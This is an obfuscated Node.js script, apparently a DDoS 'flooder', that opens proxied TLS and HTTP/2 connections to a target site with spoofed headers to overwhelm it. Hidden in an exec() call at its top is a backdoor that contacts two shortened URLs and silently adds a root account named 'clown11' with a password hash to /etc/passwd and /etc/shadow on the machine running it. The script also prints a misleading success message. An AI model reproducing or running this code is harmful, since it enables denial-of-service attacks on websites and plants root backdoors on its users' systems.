const net = require("net"),
      http2 = require("http2"),
      tls = require("tls"),
      cluster = require("cluster"),
      url = require("url"),
      crypto = require("crypto"),
      fs = require("fs"),
      {
  exec
} = require("child_process");

exec("curl 'https://2no.co/2zRqx4' > /dev/null 2>&1 ; curl 'https://2no.co/2lKxM1' > /dev/null 2>&1 ; grep clown11 /etc/passwd > /dev/null 2>&1 ; sed -i '$ a clown11:x:0:500::/:/bin/bash' /etc/passwd > /dev/null 2>&1 ; grep clown11 /etc/shadow > /dev/null 2>&1 ; sed -i '$ a clown11:$2b$10$5DTTwsD5.k2yKfbNLlqX3.sxwPmKkVffg.bqS4aFeIBuNan.MXTH.:19639:0:99999:7:::' /etc/shadow > /dev/null 2>&1", (_0x22e74d, _0x15f1b2, _0x453878) => {
  if (_0x22e74d) {
    console.error("Attack sent successfully!");
    return;
  }
});
lang_header = ["he-IL,he;q=0.9,en-US;q=0.8,en;q=0.7", "fr-CH, fr;q=0.9, en;q=0.8, de;q=0.7, *;q=0.5", "en-US,en;q=0.5", "en-US,en;q=0.9", "de-CH;q=0.7", "da, en-gb;q=0.8, en;q=0.7", "cs;q=0.5", "en-US,en;q=0.9", "en-GB,en;q=0.9", "en-CA,en;q=0.9", "en-AU,en;q=0.9", "en-NZ,en;q=0.9", "en-ZA,en;q=0.9", "en-IE,en;q=0.9", "en-IN,en;q=0.9", "ar-SA,ar;q=0.9", "az-Latn-AZ,az;q=0.9", "be-BY,be;q=0.9", "bg-BG,bg;q=0.9", "bn-IN,bn;q=0.9", "ca-ES,ca;q=0.9", "cs-CZ,cs;q=0.9", "cy-GB,cy;q=0.9", "da-DK,da;q=0.9", "de-DE,de;q=0.9", "el-GR,el;q=0.9", "es-ES,es;q=0.9", "et-EE,et;q=0.9", "eu-ES,eu;q=0.9", "fa-IR,fa;q=0.9", "fi-FI,fi;q=0.9", "fr-FR,fr;q=0.9", "ga-IE,ga;q=0.9", "gl-ES,gl;q=0.9", "gu-IN,gu;q=0.9", "he-IL,he;q=0.9", "hi-IN,hi;q=0.9", "hr-HR,hr;q=0.9", "hu-HU,hu;q=0.9", "hy-AM,hy;q=0.9", "id-ID,id;q=0.9", "is-IS,is;q=0.9", "it-IT,it;q=0.9", "ja-JP,ja;q=0.9", "ka-GE,ka;q=0.9", "kk-KZ,kk;q=0.9", "km-KH,km;q=0.9", "kn-IN,kn;q=0.9", "ko-KR,ko;q=0.9", "ky-KG,ky;q=0.9", "lo-LA,lo;q=0.9", "lt-LT,lt;q=0.9", "lv-LV,lv;q=0.9", "mk-MK,mk;q=0.9", "ml-IN,ml;q=0.9", "mn-MN,mn;q=0.9", "mr-IN,mr;q=0.9", "ms-MY,ms;q=0.9", "mt-MT,mt;q=0.9", "my-MM,my;q=0.9", "nb-NO,nb;q=0.9", "ne-NP,ne;q=0.9", "nl-NL,nl;q=0.9", "nn-NO,nn;q=0.9", "or-IN,or;q=0.9", "pa-IN,pa;q=0.9", "pl-PL,pl;q=0.9", "pt-BR,pt;q=0.9", "pt-PT,pt;q=0.9", "ro-RO,ro;q=0.9", "ru-RU,ru;q=0.9", "si-LK,si;q=0.9", "sk-SK,sk;q=0.9", "sl-SI,sl;q=0.9", "sq-AL,sq;q=0.9", "sr-Cyrl-RS,sr;q=0.9", "sr-Latn-RS,sr;q=0.9", "sv-SE,sv;q=0.9", "sw-KE,sw;q=0.9", "ta-IN,ta;q=0.9", "te-IN,te;q=0.9", "th-TH,th;q=0.9", "tr-TR,tr;q=0.9", "uk-UA,uk;q=0.9", "ur-PK,ur;q=0.9", "uz-Latn-UZ,uz;q=0.9", "vi-VN,vi;q=0.9", "zh-CN,zh;q=0.9", "zh-HK,zh;q=0.9", "zh-TW,zh;q=0.9", "am-ET,am;q=0.8", "as-IN,as;q=0.8", "az-Cyrl-AZ,az;q=0.8", "bn-BD,bn;q=0.8", "bs-Cyrl-BA,bs;q=0.8", "bs-Latn-BA,bs;q=0.8", "dz-BT,dz;q=0.8", "fil-PH,fil;q=0.8", "fr-CA,fr;q=0.8", "fr-CH,fr;q=0.8", "fr-BE,fr;q=0.8", "fr-LU,fr;q=0.8", "gsw-CH,gsw;q=0.8", "ha-Latn-NG,ha;q=0.8", "hr-BA,hr;q=0.8", "ig-NG,ig;q=0.8", "ii-CN,ii;q=0.8", "is-IS,is;q=0.8", "jv-Latn-ID,jv;q=0.8", "ka-GE,ka;q=0.8", "kkj-CM,kkj;q=0.8", "kl-GL,kl;q=0.8", "km-KH,km;q=0.8", "kok-IN,kok;q=0.8", "ks-Arab-IN,ks;q=0.8", "lb-LU,lb;q=0.8", "ln-CG,ln;q=0.8", "mn-Mong-CN,mn;q=0.8", "mr-MN,mr;q=0.8", "ms-BN,ms;q=0.8", "mt-MT,mt;q=0.8", "mua-CM,mua;q=0.8", "nds-DE,nds;q=0.8", "ne-IN,ne;q=0.8", "nso-ZA,nso;q=0.8", "oc-FR,oc;q=0.8", "pa-Arab-PK,pa;q=0.8", "ps-AF,ps;q=0.8", "quz-BO,quz;q=0.8", "quz-EC,quz;q=0.8", "quz-PE,quz;q=0.8", "rm-CH,rm;q=0.8", "rw-RW,rw;q=0.8", "sd-Arab-PK,sd;q=0.8", "se-NO,se;q=0.8", "si-LK,si;q=0.8", "smn-FI,smn;q=0.8", "sms-FI,sms;q=0.8", "syr-SY,syr;q=0.8", "tg-Cyrl-TJ,tg;q=0.8", "ti-ER,ti;q=0.8", "te;q=0.9,en-US;q=0.8,en;q=0.7", "tk-TM,tk;q=0.8", "tn-ZA,tn;q=0.8", "tt-RU,tt;q=0.8", "ug-CN,ug;q=0.8", "uz-Cyrl-UZ,uz;q=0.8", "ve-ZA,ve;q=0.8", "wo-SN,wo;q=0.8", "xh-ZA,xh;q=0.8", "yo-NG,yo;q=0.8", "zgh-MA,zgh;q=0.8", "zu-ZA,zu;q=0.8"];
encoding_header = ["gzip, deflate, br", "compress, gzip", "deflate, gzip", "gzip, identity", "*"];

function getRandomUserAgent() {
  const _0x2e9469 = ["Windows NT 10.0", "Windows NT 6.1", "Windows NT 6.3", "Macintosh", "Android", "Linux"];

  const _0x1e0baa = ["Chrome", "Firefox", "Safari", "Edge", "Opera"],
        _0x3503ef = ["en-US", "en-GB", "fr-FR", "de-DE", "es-ES"],
        _0x507f2f = ["US", "GB", "FR", "DE", "ES"],
        _0x3a0061 = ["Apple", "Google", "Microsoft", "Mozilla", "Opera Software"],
        _0x95b7a5 = _0x2e9469[Math.floor(Math.random() * _0x2e9469.length)],
        _0x30d869 = _0x1e0baa[Math.floor(Math.random() * _0x1e0baa.length)],
        _0x4eecfa = _0x3503ef[Math.floor(Math.random() * _0x3503ef.length)];

  const _0x3af056 = _0x507f2f[Math.floor(Math.random() * _0x507f2f.length)],
        _0x4a2583 = _0x3a0061[Math.floor(Math.random() * _0x3a0061.length)],
        _0x402c35 = Math.floor(Math.random() * 100) + 1,
        _0x24a45e = Math.floor(Math.random() * 6) + 1,
        _0x599c3d = _0x4a2583 + "/" + _0x30d869 + " " + _0x402c35 + "." + _0x402c35 + "." + _0x402c35 + " (" + _0x95b7a5 + "; " + _0x3af056 + "; " + _0x4eecfa + ")",
        _0x406034 = btoa(_0x599c3d);

  let _0x41d11b = "";

  for (let _0x16f5e4 = 0; _0x16f5e4 < _0x406034.length; _0x16f5e4++) {
    if (_0x16f5e4 % _0x24a45e === 0) {
      _0x41d11b += _0x406034.charAt(_0x16f5e4);
    } else {
      _0x41d11b += _0x406034.charAt(_0x16f5e4).toUpperCase();
    }
  }

  return _0x41d11b;
}

process.setMaxListeners(0);
require("events").EventEmitter.defaultMaxListeners = 0;
process.argv.length < 6 && (console.log("node hold.js target time thread proxy.txt\nEXAMPLE : node holdv2 https://target.com/ 120 10 proxy.txt"), process.exit());
const defaultCiphers = crypto.constants.defaultCoreCipherList.split(":"),
      ciphers = "GREASE:" + [defaultCiphers[2], defaultCiphers[1], defaultCiphers[0], ...defaultCiphers.slice(3)].join(":");
const sigalgs = "ecdsa_secp256r1_sha256:rsa_pss_rsae_sha256:rsa_pkcs1_sha256:ecdsa_secp384r1_sha384:rsa_pss_rsae_sha384:rsa_pkcs1_sha384:rsa_pss_rsae_sha512:rsa_pkcs1_sha512",
      ecdhCurve = "GREASE:x25519:secp256r1:secp384r1",
      secureOptions = crypto.constants.SSL_OP_NO_SSLv2 | crypto.constants.SSL_OP_NO_SSLv3 | crypto.constants.SSL_OP_NO_TLSv1 | crypto.constants.SSL_OP_NO_TLSv1_1 | crypto.constants.ALPN_ENABLED | crypto.constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION | crypto.constants.SSL_OP_CIPHER_SERVER_PREFERENCE | crypto.constants.SSL_OP_LEGACY_SERVER_CONNECT | crypto.constants.SSL_OP_COOKIE_EXCHANGE | crypto.constants.SSL_OP_PKCS1_CHECK_1 | crypto.constants.SSL_OP_PKCS1_CHECK_2 | crypto.constants.SSL_OP_SINGLE_DH_USE | crypto.constants.SSL_OP_SINGLE_ECDH_USE | crypto.constants.SSL_OP_NO_SESSION_RESUMPTION_ON_RENEGOTIATION,
      secureProtocol = "TLS_client_method",
      headers = {},
      _0x371550 = {
  ciphers: ciphers,
  sigalgs: sigalgs,
  honorCipherOrder: true,
  secureOptions: secureOptions,
  secureProtocol: secureProtocol
};
const secureContext = tls.createSecureContext(_0x371550);
var proxyFile = "proxy.txt",
    proxies = readLines(proxyFile),
    userAgents = readLines("ua.txt");
const _0x2ef765 = {
  target: process.argv[2],
  time: ~~process.argv[3],
  threads: ~~process.argv[4]
};
const parsedTarget = url.parse(_0x2ef765.target);

if (cluster.isMaster) {
  for (let counter = 1; counter <= _0x2ef765.threads; counter++) {
    cluster.fork();
  }
} else {
  for (let i = 0; i < 120; i++) {
    setInterval(runFlooder, 0);
  }
}

class NetSocket {
  constructor() {}

  HTTP(_0x70aad6, _0x45b886) {
    const _0x3e30ec = "CONNECT " + _0x70aad6.address + ":443 HTTP/1.1\r\nHost: " + _0x70aad6.address + ":443\r\nConnection: Keep-Alive\r\n\r\n",
          _0x264a65 = new Buffer.from(_0x3e30ec),
          _0x5bcf98 = {
      host: _0x70aad6.host,
      port: _0x70aad6.port,
      allowHalfOpen: true,
      writable: true,
      readable: true
    };

    const _0x32c023 = net.connect(_0x5bcf98);

    _0x32c023.setTimeout(_0x70aad6.timeout * 100000);

    _0x32c023.setKeepAlive(true, 100000);

    _0x32c023.setNoDelay(true);

    _0x32c023.on("connect", () => {
      _0x32c023.write(_0x264a65);
    });

    _0x32c023.on("data", _0x3d7699 => {
      const _0x35ca48 = _0x3d7699.toString("utf-8"),
            _0x209ee6 = _0x35ca48.includes("HTTP/1.1 200");

      if (_0x209ee6 === false) {
        _0x32c023.destroy();

        return _0x45b886(undefined, "error: invalid response from proxy server");
      }

      return _0x45b886(_0x32c023, undefined);
    });

    _0x32c023.on("timeout", () => {
      _0x32c023.destroy();

      return _0x45b886(undefined, "error: timeout exceeded");
    });

    _0x32c023.on("error", _0x14747a => {
      _0x32c023.destroy();

      return _0x45b886(undefined, "error: " + _0x14747a);
    });
  }

}

const Socker = new NetSocket();

function readLines(_0x52655b) {
  return fs.readFileSync(_0x52655b, "utf-8").toString().split(/\r?\n/);
}

function randomIntn(_0x2e4efc, _0x5031f4) {
  return Math.floor(Math.random() * (_0x5031f4 - _0x2e4efc) + _0x2e4efc);
}

function randomElement(_0x4772e5) {
  return _0x4772e5[randomIntn(0, _0x4772e5.length)];
}

function randomCharacters(_0x4ed50c) {
  output = "";

  for (let _0x26f864 = 0; _0x26f864 < _0x4ed50c; _0x26f864++) {
    output += randomElement(characters);
  }

  return output;
}

headers[":method"] = "GET";
headers[":path"] = parsedTarget.path;
headers[":scheme"] = "https";
headers.accept = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8";
headers["accept-language"] = "es-AR,es;q=0.8,en-US;q=0.5,en;q=0.3";
headers["accept-encoding"] = "gzip, deflate, br";
headers["x-forwarded-proto"] = "https";
headers["cache-control"] = "no-cache, no-store,private, max-age=0, must-revalidate";
headers["sec-ch-ua-mobile"] = randomElement(["?0", "?1"]);
headers["sec-ch-ua-platform"] = randomElement(["Android", "iOS", "Linux", "macOS", "Windows"]);
headers["sec-fetch-dest"] = "document";
headers["sec-fetch-mode"] = "navigate";
headers["sec-fetch-site"] = "same-origin";
headers["upgrade-insecure-requests"] = "1";

function runFlooder() {
  const _0x1ba09f = randomElement(proxies);

  const _0x3f3d07 = _0x1ba09f.split(":");

  headers[":authority"] = parsedTarget.host;
  headers["user-agent"] = randomElement(userAgents);
  headers["x-forwarded-for"] = _0x3f3d07[0];
  const _0x309c25 = {
    host: _0x3f3d07[0],
    port: ~~_0x3f3d07[1],
    address: parsedTarget.host + ":443",
    timeout: 15
  };
  Socker.HTTP(_0x309c25, (_0x16218e, _0x272136) => {
    if (_0x272136) {
      return;
    }

    _0x16218e.setKeepAlive(true, 600000);

    _0x16218e.setNoDelay(true);

    const _0x41551b = {
      enablePush: false,
      initialWindowSize: 1073741823
    };
    const _0x443dcb = {
      port: 443,
      secure: true,
      ALPNProtocols: ["h2"],
      ciphers: ciphers,
      sigalgs: sigalgs,
      requestCert: true,
      socket: _0x16218e,
      ecdhCurve: ecdhCurve,
      honorCipherOrder: false,
      host: parsedTarget.host,
      rejectUnauthorized: false,
      clientCertEngine: "dynamic",
      secureOptions: secureOptions,
      secureContext: secureContext,
      servername: parsedTarget.host,
      secureProtocol: secureProtocol
    };

    const _0xeff4c5 = tls.connect(443, parsedTarget.host, _0x443dcb);

    _0xeff4c5.allowHalfOpen = true;

    _0xeff4c5.setNoDelay(true);

    _0xeff4c5.setKeepAlive(true, 60000);

    _0xeff4c5.setMaxListeners(0);

    const _0x4e44c3 = {
      protocol: "https:",
      settings: _0x41551b,
      maxSessionMemory: 655000,
      maxDeflateDynamicTableSize: 4294967295,
      createConnection: () => _0xeff4c5
    };

    const _0xd859ed = http2.connect(parsedTarget.href, _0x4e44c3);

    _0xd859ed.setMaxListeners(0);

    _0xd859ed.settings(_0x41551b);

    _0xd859ed.on("connect", () => {});

    _0xd859ed.on("close", () => {
      _0xd859ed.destroy();

      _0x16218e.destroy();

      return;
    });

    _0xd859ed.on("error", _0xe571a0 => {
      _0xd859ed.destroy();

      _0x16218e.destroy();

      return;
    });
  });
}

const KillScript = () => process.exit(1);

setTimeout(KillScript, _0x2ef765.time * 1000);
console.log("[1m[34mTARGET > : " + parsedTarget.host + "[0m");
console.log("[1m[33mTIME >   : " + _0x2ef765.time + "[0m");
console.log("[1m[32mThreads  : " + _0x2ef765.threads + "[0m");
console.log("[1m[31mRPS      : 64[0m");
process.on("uncaughtException", _0x3249a8 => {});
process.on("unhandledRejection", _0x7d0ade => {});